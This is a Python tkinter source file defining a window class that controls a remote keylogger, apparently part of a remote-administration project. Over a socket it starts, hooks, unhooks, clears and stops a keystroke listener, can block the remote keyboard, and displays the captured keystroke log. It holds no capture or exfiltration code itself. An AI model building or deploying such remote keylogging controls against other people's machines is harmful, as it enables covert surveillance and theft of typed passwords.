import tkinter as tk
import tkinter.scrolledtext as st
import ui.label as lb
import ui.constraints as const
import ui.ui_template as tpl

from services.count import Count
class UI_keylogger(tpl.UI_ToplevelTemplate):
    def __init__(self, parent, socket_queue, ui_queues):
        super().__init__(parent, 'keyboard', socket_queue, ui_queues)

        self.title = lb.KEYLOGGER_TITLE
        self.protocol("WM_DELETE_WINDOW", self.close)
        self.resizable(False, False)
        self['padx'] = const.WINDOW_BORDER_PADDING
        self['pady'] = const.WINDOW_BORDER_PADDING

        self.btn_hook_stt = tk.StringVar(self, lb.KEYLOGGER_HOOK)
        self.btn_hook = tk.Button(self, textvariable = self.btn_hook_stt, width = 15, height = 2, command = self.hook)
        self.btn_hook.grid(row = 0, column = 0, sticky = tk.EW)

        self.btn_clear = tk.Button(self, text = lb.KEYLOGGER_CLEAR, width = 15, height = 2, command = self.clear)
        self.btn_clear.grid(row = 1, column = 0, sticky = tk.EW)

        self.btn_block_stt = tk.StringVar(self, lb.KEYLOGGER_BLOCK)
        self.btn_block = tk.Button(self, textvariable = self.btn_block_stt, width = 15, height = 4, command = self.block)
        self.btn_block.grid(row = 0, column = 1, rowspan = 2, sticky = tk.NSEW)
        
        self.text_log = st.ScrolledText(self, wrap = tk.WORD, width = 60, height = 20)
        self.text_log.grid(row = 2, column = 0, columnspan = 2, pady = (5,0))
        self.text_log['state'] = 'disabled'

        self.update_counter = Count(2, self.socket_cmd, 'listener-get')
        self.socket_cmd("listener-start")

    def hook(self):
        if self.btn_hook_stt.get() == lb.KEYLOGGER_HOOK:
            self.socket_cmd("listener-hook")
            self.btn_hook_stt.set(lb.KEYLOGGER_UNHOOK)
        else:
            self.socket_cmd("listener-unhook")
            self.btn_hook_stt.set(lb.KEYLOGGER_HOOK)

    def block(self):
        if self.btn_block_stt.get() == lb.KEYLOGGER_BLOCK:
            self.socket_cmd("listener-block")
            self.btn_block_stt.set(lb.KEYLOGGER_UNBLOCK)
        else:
            self.socket_cmd("listener-unblock")
            self.btn_block_stt.set(lb.KEYLOGGER_BLOCK)

    def clear(self):
        self.socket_cmd("listener-clear")

        if self.btn_hook_stt.get() == lb.KEYLOGGER_HOOK:
            self.text_log.config(state = 'normal')
            self.text_log.delete(1.0, tk.END)
            self.text_log.config(state = 'disabled')

    def close(self):
        self.socket_cmd("listener-stop")
        self.destroy()

    def update_ui(self, task):
        cmd, ext = task

        if cmd == "update-log":
            self.text_log.config(state = 'normal')
            self.text_log.delete(1.0, tk.END)
            self.text_log.insert(tk.INSERT, ext)
            self.text_log.config(state = 'disabled')

    def periodic_call(self):
        if self.btn_hook_stt.get() == lb.KEYLOGGER_UNHOOK:
            self.update_counter.count_up()

        super().periodic_call()
